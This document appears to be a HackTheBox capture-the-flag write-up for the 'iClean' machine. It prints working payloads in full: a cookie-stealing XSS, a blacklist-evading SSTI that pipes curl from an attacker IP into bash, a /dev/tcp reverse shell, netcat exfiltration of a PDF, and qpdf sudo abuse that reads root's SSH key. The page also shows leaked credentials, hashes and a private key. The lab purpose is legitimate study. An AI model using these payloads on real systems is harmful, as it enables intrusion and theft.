---
layout: post
title: iClean - Easy - Windows
date: 04-05-2024
categories: [CTF - HackTheBox]
tag: [File Disclosure, hMailServer, MSSQLCE, Microsoft Outlook, CVE-2024-21413, LibreOffice, NTLM, Responder]
---

# Nmap scan
Port scan revealed 2 ports of interest. SSH and Apache running on an Ubuntu operating system.
```
# Nmap 7.94SVN scan initiated Mon Apr  8 17:55:37 2024 as: nmap -sCV -p- -v -oN portscan.log 10.10.11.12
Nmap scan report for 10.10.11.12
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  8 17:56:00 2024 -- 1 IP address (1 host up) scanned in 23.12 seconds
```

# Inspecting port 80 (vhost http://capiclean.htb)

When accessing port 80 in the web browser it redirects the request to the vhost `capiclean.htb`. The hosts file was updated with this entry to make sure it resolves correctly. 

```
┌──(kali㉿kali)-[~/hackthebox/iclean]
└─$ curl -v 10.10.11.12                                      
*   Trying 10.10.11.12:80...
* Connected to 10.10.11.12 (10.10.11.12) port 80
> GET / HTTP/1.1
> Host: 10.10.11.12
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Tue, 09 Apr 2024 01:13:55 GMT
< Server: Apache/2.4.52 (Ubuntu)
< Last-Modified: Tue, 05 Sep 2023 16:40:51 GMT
< ETag: "112-6049f4a35f3a4"
< Accept-Ranges: bytes
< Content-Length: 274
< Vary: Accept-Encoding
< Content-Type: text/html
< 
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://capiclean.htb">
</head>
<body>
    <!-- Optional content for users without JavaScript -->
    <p>If you are not redirected, <a href="http://capiclean.htb">click here</a>.</p>
</body>
</html>
* Connection #0 to host 10.10.11.12 left intact
```

# Directory enumeration

Gobuster found a number of endpoints. The vhost is being powered by Werkzug. The dashboard endpoint is most interesting. A valid session is required to access the dashboard.

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://capiclean.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 2106]
/logout               (Status: 302) [Size: 189] [--> /]
/about                (Status: 200) [Size: 5267]
/services             (Status: 200) [Size: 8592]
/.                    (Status: 200) [Size: 16697]
/dashboard            (Status: 302) [Size: 189] [--> /]
/team                 (Status: 200) [Size: 8109]
/quote                (Status: 200) [Size: 2237]
/server-status        (Status: 403) [Size: 278]
```

# Login bypass attempts - All failed

NoSQL / Standard SQL injection failed to bypass login page.
 
# Inspecting quote - http://capiclean.htb/quote

There is a web page which allows the user to submit their email address and the service they want via web form. Below is an example of a normal request.
 
## Request
 ```
POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/quote
Upgrade-Insecure-Requests: 1

service=Carpet+Cleaning&email=test%40test.com
 ```

## Response (stripped)
 ```
<p class="ipsum_text">Your quote request was sent to our management team. They will reach out soon via email. Thank you for the interest you have shown in our services.</p>
 ```
 
# XSS - http://capiclean.htb/quote

After intercepting the request and testing various payloads it was possible to send a XSS payload within the service parameter. This type of attack is often used to steal cookies. If a valid cookie was returned it may be possible to send it with future requests and gain access to the dashboard.
 
## Payload Example

Below is an example of an XSS payload which sends the cookies of the victim to a web server controlled by the attacker. In this example the cookies are also base64 encoded for data integrity.
 
 ```
 <img src=x onerror=this.src="http://10.10.14.21/"+btoa(document.cookie)/>
```

## XSS Request

The finalized request in full.

```
POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/quote
Upgrade-Insecure-Requests: 1

service=<img+src%3dx+onerror%3dthis.src%3d"http%3a//10.10.14.21/"%2bbtoa(document.cookie)/>&email=test%40test.com
```
### XSS Response

A simple python web server was used to intercept the request made by the victim. The GET data contains some base64 encoded data which looks promising.

```
┌──(kali㉿kali)-[~/hackthebox/iclean]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.12 - - [08/Apr/2024 21:31:50] code 404, message File not found
10.10.11.12 - - [08/Apr/2024 21:31:50] "GET /c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlpoUVJsdy5oY0pxRHVrOGxjakRiY0dHMy1WWlB4Mkl6OEE= HTTP/1.1" 404 -
```

# Decoding Cookie

Decoding the data revealed a session cookie. The cookie is a JWT which has a role variable. The role variable has a value of an MD5 hash which when reversed equals the string admin.

### Convert from base64 to plaintext
```
┌──(kali㉿kali)-[~/hackthebox/iclean]
└─$ echo c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlpoUVJsdy5oY0pxRHVrOGxjakRiY0dHMy1WWlB4Mkl6OEE= | base64 -d
session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhQRlw.hcJqDuk8lcjDbcGG3-VZPx2Iz8A 
```
### JWT Decode
```json
{
  "role": "21232f297a57a5a743894a0e4a801fc3"
}
```
### Reverse MD5 value
```
21232f297a57a5a743894a0e4a801fc3 = admin
```

# Accessing Dashboard - http://capiclean.htb/dashboard

Adding the cookie into the browsers storage allowed access to the dashboard. The dashboard has a number of features which have been listed below. After extensive testing with mostly SSTI payloads I could only find one endpoint that was vulnerable.

### Dashboard Features

* Generate Invoice - Not vulnerable
* Generate QR - Vulnerable to SSTI
* Edit Services - Not vulnerable
* Quote Requests - Not vulnerable
### 

# SSTI - Generate QR
The `qr_link` parameter of  this endpoint was vulnerable to SSTI. Below is an example request.

## Example Request
```
POST /QRGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/QRGenerator
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhQRlw.hcJqDuk8lcjDbcGG3-VZPx2Iz8A
Upgrade-Insecure-Requests: 1

invoice_id=&form_type=scannable_invoice&qr_link={{5*'5'}}
```
## RCE Payload Example

Its possible to obtain RCE using SSTI with various payloads. A lot of the common RCE payloads failed to work due to a blacklist being in place.

Source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('sleep+5')|attr('read')()}}
```
## Modifed Payload

Sleep is good for testing command execution blind. To improve the payload to gain a foothold the below modifications were made. This will reach out to a web server the attacker controls, download a file and pipe the contents of that file to bash. The contents of the file in this case was a reverse shell payload which can be viewed below.

`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl+10.10.14.21/shell+|bash')|attr('read')()}}`

## Testing Payload

Below is the full request including payload.

```
POST /QRGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/QRGenerator
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhQRlw.hcJqDuk8lcjDbcGG3-VZPx2Iz8A
Upgrade-Insecure-Requests: 1

"invoice_id=&form_type=scannable_invoice&qr_link={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl+10.10.14.21/shell+|bash')|attr('read')()}}"
```

### Victim downloads file
```
┌──(kali㉿kali)-[~/hackthebox/iclean]
└─$  python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.12 - - [08/Apr/2024 21:49:58] "GET /shell HTTP/1.1" 200 -
```
### Contents of shell
```
┌──(kali㉿kali)-[~/hackthebox/iclean]
└─$ cat shell                                                          
bash -i >& /dev/tcp/10.10.14.21/8888 0>&1
```
# Reverse Shell obtained as www-data
```
┌──(kali㉿kali)-[~/hackthebox/iclean]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.12] 37994
bash: cannot set terminal process group (1219): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ 
```

# Enumerating SQL database
The app.py file contained the SQL credentials as seen below.
```
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```
## Logging into database and extracting hashes
```
www-data@iclean:/opt/app$ mysql -u iclean -p
mysql -u iclean -p
Enter password: pxCsmnGLckUb

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 27308
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| capiclean          |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use capiclean;
use capiclean;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> select * from users;
select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.01 sec)

mysql> 
```

# Cracking Hashes
Hashcat found the password of the `consuela` user. Rockyou.txt wordlist was used.
```
0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean
```

# SSH Access - User consuela
The credentials worked and granted access as the `consuela` via SSH. User flag captured.

```
┌──(kali㉿kali)-[~/hackthebox/iclean]
└─$ ssh consuela@capiclean.htb         
consuela@capiclean.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Tue Apr  9 01:55:43 AM UTC 2024




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


You have mail.
Last login: Mon Apr  8 23:07:37 2024 from 10.10.14.21
consuela@iclean:~$ id
uid=1000(consuela) gid=1000(consuela) groups=1000(consuela)
consuela@iclean:~$ ls -la
total 36
drwxr-x--- 5 consuela consuela 4096 Apr  8 23:28 .
drwxr-xr-x 3 root     root     4096 Sep  5  2023 ..
lrwxrwxrwx 1 consuela consuela    9 Sep  5  2023 .bash_history -> /dev/null
-rw-r--r-- 1 consuela consuela  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 consuela consuela 3771 Jan  6  2022 .bashrc
drwx------ 2 consuela consuela 4096 Mar  2 07:51 .cache
drwx------ 3 consuela consuela 4096 Apr  8 19:57 .gnupg
-rw-r--r-- 1 consuela consuela  807 Jan  6  2022 .profile
drwx------ 2 consuela consuela 4096 Sep  5  2023 .ssh
-rw-r----- 1 root     consuela   33 Apr  8 15:46 user.txt
consuela@iclean:~$ cat user.txt
54517b92d5976a76ee4b693994baa3fc
consuela@iclean:~$ 
```

# Sudo permissions
The user `consuela` has sudo permissions to execute the `qpdf` binary as root. Next step will be checking for known vulnerabilities.

```
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

# QPDF
QPDF is both a software library and a free command-line program that can convert one PDF file to another equivalent PDF file. It is capable of performing transformations such as linearization, encryption, and decryption of PDF files

### Version Check
```
consuela@iclean:~$ sudo qpdf --version
qpdf version 10.6.3
Run qpdf --copyright to see copyright and license information.
```
### CVE Check
Version 10.6.3 has multiple CVE's due to being outdated. Unfortunately none of them seem to have any value for this situation.
### Function Check
```
consuela@iclean:~$ sudo qpdf --help
Run "qpdf --help=topic" for help on a topic.
Run "qpdf --help=--option" for help on an option.
Run "qpdf --help=all" to see all available help.

Topics:
  add-attachment: attach (embed) files
  advanced-control: tweak qpdf's behavior
  attachments: work with embedded files
  completion: shell completion
  copy-attachments: copy attachments from another file
  encryption: create encrypted files
  exit-status: meanings of qpdf's exit codes
  general: general options
  help: information about qpdf
  inspection: inspect PDF files
  json: JSON output for PDF information
  modification: change parts of the PDF
  overlay-underlay: overlay/underlay pages from other files
  page-ranges: page range syntax
  page-selection: select pages from one or more files
  pdf-dates: PDF date format
  testing: options for testing or debugging
  transformation: make structural PDF changes
  usage: basic invocation

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
```
## Reading Root Files
Since there are no useful CVE's it may be possible to use the normal function of the program to get root. This is only possible since the program is allowed to run as root therefore it should be albe to read root owned files.

There is an interesting function called `add-attachment`. After reading the documentation and testing it lead to the below series of commands.

### Adding root SSH keys to pdf as attachment
Blindly hoping there is a root SSH key on the machine and trying to attach it to the PDF. No error messages saying the file cannot be found which is a good sign.

```
consuela@iclean:~$ sudo qpdf --add-attachment /root/.ssh/id_rsa -- sample.pdf outfile.pdf
consuela@iclean:~$ ls
outfile.pdf  sample.pdf  user.txt
```
### Transferring pdf with netcat
Transferred the file over to my local machine with netcat. After opening the PDF I could not see any attachments. If attempted to grep the contents of the  PDF for keywords such as "SSH", "PRIVATE" or "KEY" it returned a message saying the contents were binary. That message shows there is something there it only needs to be extracted correctly.

```
consuela@iclean:~$ cat outfile.pdf | nc 10.10.14.21 8000
```
### Binwalking PDF to extract text
Binwalk was used to parse the contents of the PDF from binary to plaintext as seen below. I used a fairly large PDF which created a lot of junk output. Using a smaller PDF would have prevented this.

```
┌──(kali㉿kali)-[~/hackthebox/iclean]
└─$ binwalk -Me outfile.pdf 

Scan Time:     2024-04-08 22:09:04
Target File:   /home/kali/hackthebox/iclean/outfile.pdf
MD5 Checksum:  14aa7f63f92e6dd9ea5372cb4d33d048
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.5"
101           0x65            Zlib compressed data, default compression
2558          0x9FE           Zlib compressed data, default compression
3717          0xE85           Zlib compressed data, best compression
10668         0x29AC          Zlib compressed data, best compression
17624         0x44D8          Zlib compressed data, best compression
27371         0x6AEB          Zlib compressed data, best compression
34368         0x8640          Zlib compressed data, best compression
41330         0xA172          Zlib compressed data, best compression
53609         0xD169          Zlib compressed data, best compression
74077         0x1215D         Zlib compressed data, best compression
91374         0x164EE         Zlib compressed data, best compression
91781         0x16685         Zlib compressed data, best compression
92408         0x168F8         Zlib compressed data, best compression
92820         0x16A94         Zlib compressed data, best compression
93451         0x16D0B         Zlib compressed data, best compression
93829         0x16E85         Zlib compressed data, best compression
94445         0x170ED         Zlib compressed data, best compression
94859         0x1728B         Zlib compressed data, best compression
95491         0x17503         Zlib compressed data, best compression
95878         0x17686         Zlib compressed data, best compression
96502         0x178F6         Zlib compressed data, best compression
96878         0x17A6E         Zlib compressed data, best compression
97502         0x17CDE         Zlib compressed data, best compression
97913         0x17E79         Zlib compressed data, best compression
98548         0x180F4         Zlib compressed data, best compression
98925         0x1826D         Zlib compressed data, best compression
99542         0x184D6         Zlib compressed data, best compression
99956         0x18674         Zlib compressed data, best compression
100587        0x188EB         Zlib compressed data, best compression
100962        0x18A62         Zlib compressed data, best compression
101578        0x18CCA         Zlib compressed data, best compression
101953        0x18E41         Zlib compressed data, best compression
102569        0x190A9         Zlib compressed data, best compression
102984        0x19248         Zlib compressed data, best compression
103616        0x194C0         Zlib compressed data, best compression
104024        0x19658         Zlib compressed data, best compression
104652        0x198CC         Zlib compressed data, best compression
105071        0x19A6F         Zlib compressed data, best compression
105712        0x19CF0         Zlib compressed data, best compression
106086        0x19E66         Zlib compressed data, best compression
106701        0x1A0CD         Zlib compressed data, best compression
107109        0x1A265         Zlib compressed data, best compression
107738        0x1A4DA         Zlib compressed data, best compression
108114        0x1A652         Zlib compressed data, best compression
108732        0x1A8BC         Zlib compressed data, best compression
109106        0x1AA32         Zlib compressed data, best compression
109720        0x1AC98         Zlib compressed data, best compression
110132        0x1AE34         Zlib compressed data, best compression
110762        0x1B0AA         Zlib compressed data, best compression
111139        0x1B223         Zlib compressed data, best compression
111755        0x1B48B         Zlib compressed data, best compression
112131        0x1B603         Zlib compressed data, best compression
112747        0x1B86B         Zlib compressed data, best compression
113121        0x1B9E1         Zlib compressed data, best compression
113734        0x1BC46         Zlib compressed data, best compression
114117        0x1BDC5         Zlib compressed data, best compression
114738        0x1C032         Zlib compressed data, best compression
115113        0x1C1A9         Zlib compressed data, best compression
115977        0x1C509         Zlib compressed data, default compression
116607        0x1C77F         Zlib compressed data, default compression
```
### Binwalk - Output
The total output of the extraction. Lots of junk due to file size of PDF used.

```
┌──(kali㉿kali)-[~/hackthebox/iclean/_outfile.pdf.extracted]
└─$ ls
1215D       170ED.zlib  180F4       18E41.zlib  19E66       1AC98.zlib  1BC46       44D8.zlib
1215D.zlib  1728B       180F4.zlib  190A9       19E66.zlib  1AE34       1BC46.zlib  65
164EE       1728B.zlib  1826D       190A9.zlib  1A0CD       1AE34.zlib  1BDC5       65.zlib
164EE.zlib  17503       1826D.zlib  19248       1A0CD.zlib  1B0AA       1BDC5.zlib  6AEB
16685       17503.zlib  184D6       19248.zlib  1A265       1B0AA.zlib  1C032       6AEB.zlib
16685.zlib  17686       184D6.zlib  194C0       1A265.zlib  1B223       1C032.zlib  8640
168F8       17686.zlib  18674       194C0.zlib  1A4DA       1B223.zlib  1C1A9       8640.zlib
168F8.zlib  178F6       18674.zlib  19658       1A4DA.zlib  1B48B       1C1A9.zlib  9FE
16A94       178F6.zlib  188EB       19658.zlib  1A652       1B48B.zlib  1C509       9FE.zlib
16A94.zlib  17A6E       188EB.zlib  198CC       1A652.zlib  1B603       1C509.zlib  A172
16D0B       17A6E.zlib  18A62       198CC.zlib  1A8BC       1B603.zlib  1C77F       A172.zlib
16D0B.zlib  17CDE       18A62.zlib  19A6F       1A8BC.zlib  1B86B       1C77F.zlib  D169
16E85       17CDE.zlib  18CCA       19A6F.zlib  1AA32       1B86B.zlib  29AC        D169.zlib
16E85.zlib  17E79       18CCA.zlib  19CF0       1AA32.zlib  1B9E1       29AC.zlib   E85
170ED       17E79.zlib  18E41       19CF0.zlib  1AC98       1B9E1.zlib  44D8        E85.zlib
```
# Filtering Output
A simple grep should be able to highlight the file of interest. As seen below it found SSH within the '1C509' file.

```
┌──(kali㉿kali)-[~/hackthebox/iclean/_outfile.pdf.extracted]
└─$ grep -Ri SSH     
1C509:-----BEGIN OPENSSH PRIVATE KEY-----
1C509:-----END OPENSSH PRIVATE KEY-----
```
# Reading root SSH key
It worked. The key can be seen below in full. 

```
┌──(kali㉿kali)-[~/hackthebox/iclean/_outfile.pdf.extracted]
└─$ cat 1C509                                                
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```
# Root access obtained
The private key allowed root access to the machine via SSH. Root flag captured.

```
┌──(kali㉿kali)-[~/hackthebox/iclean]
└─$ ssh root@capiclean.htb -i root.key
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Tue Apr  9 02:12:46 AM UTC 2024




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Mon Apr  8 23:27:18 2024 from 10.10.14.21
root@iclean:~# id
uid=0(root) gid=0(root) groups=0(root)
root@iclean:~# cat root.txt
b1b81b9f77eba3b9be30095cdfba6c4c
root@iclean:~# 
```
